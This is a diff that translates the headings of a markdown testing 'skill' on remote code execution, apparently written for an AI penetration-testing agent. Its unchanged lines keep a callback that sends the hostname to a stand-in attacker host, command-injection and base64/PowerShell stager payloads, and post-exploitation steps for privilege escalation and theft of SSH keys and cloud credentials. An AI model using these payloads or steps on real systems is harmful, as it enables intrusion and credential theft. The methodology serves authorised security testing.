@@ -1,13 +1,13 @@
 ---
 name: rce
-description: RCE testing covering command injection, deserialization, template injection, and code evaluation
+description: 远程代码执行安全测试技能
 ---
 
-# RCE
+# 远程代码执行
 
 Remote code execution leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media pipelines, and build/runtime tooling. Focus on quiet, portable oracles and chain to stable shells only when needed.
 
-## Attack Surface
+## 攻击面
 
 **Command Execution**
 - OS command execution via wrappers (shells, system utilities, CLIs)
@@ -63,7 +63,7 @@ curl https://attacker.tld/$(hostname)
 ;(id;hostname)|base64
 ```
 
-## Key Vulnerabilities
+## 关键漏洞
 
 ### Command Injection
 
@@ -89,7 +89,7 @@ curl https://attacker.tld/$(hostname)
 - Base64 stagers: `echo payload | base64 -d | sh`
 - PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`
 
-### Template Injection
+### 模板注入
 
 Identify server-side template engines: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug
 
@@ -182,7 +182,7 @@ pop graphic-context
 - Windows variations (PowerShell vs CMD)
 - Constrained language bypasses
 
-## Post-Exploitation
+## 利用后
 
 **Privilege Escalation**
 - `sudo -l`; SUID binaries; capabilities (`getcap -r / 2>/dev/null`)
@@ -194,7 +194,7 @@ pop graphic-context
 **Lateral Movement**
 - SSH keys, cloud metadata credentials, internal service tokens
 
-## Testing Methodology
+## 测试方法
 
 1. **Identify sinks** - Command wrappers, template rendering, deserialization, file converters, report generators, plugin hooks
 2. **Establish oracle** - Timing, DNS/HTTP callbacks, or deterministic output diffs (length/ETag)
@@ -202,7 +202,7 @@ pop graphic-context
 4. **Map boundaries** - Read/write locations, outbound egress
 5. **Progress to control** - File write, scheduled execution, service restart hooks
 
-## Validation
+## 验证
 
 1. Provide a minimal, reliable oracle (DNS/HTTP/timing) proving code execution
 2. Show command context (uid, gid, cwd, env) and controlled output
@@ -210,20 +210,20 @@ pop graphic-context
 4. If containerized, prove boundary crossing attempts (host files, kube APIs) and whether they succeed
 5. Keep PoCs minimal and reproducible across runs and transports
 
-## False Positives
+## 误报
 
 - Only crashes or timeouts without controlled behavior
 - Filtered execution of a limited command subset with no attacker-controlled args
 - Sandboxed interpreters executing in a restricted VM with no IO or process spawn
 - Simulated outputs not derived from executed commands
 
-## Impact
+## 影响
 
 - Remote system control under application user; potential privilege escalation to root
 - Data theft, encryption/signing key compromise, supply-chain insertion, lateral movement
 - Cluster compromise when combined with container/Kubernetes misconfigurations
 
-## Pro Tips
+## 实战技巧
 
 1. Prefer OAST oracles; avoid long sleeps—short gated delays reduce noise
 2. When command injection is weak, pivot to file write or deserialization/SSTI paths
@@ -233,6 +233,6 @@ pop graphic-context
 6. Keep payloads portable (POSIX/BusyBox/PowerShell) and minimize dependencies
 7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops
 
-## Summary
+## 总结
 
 RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.
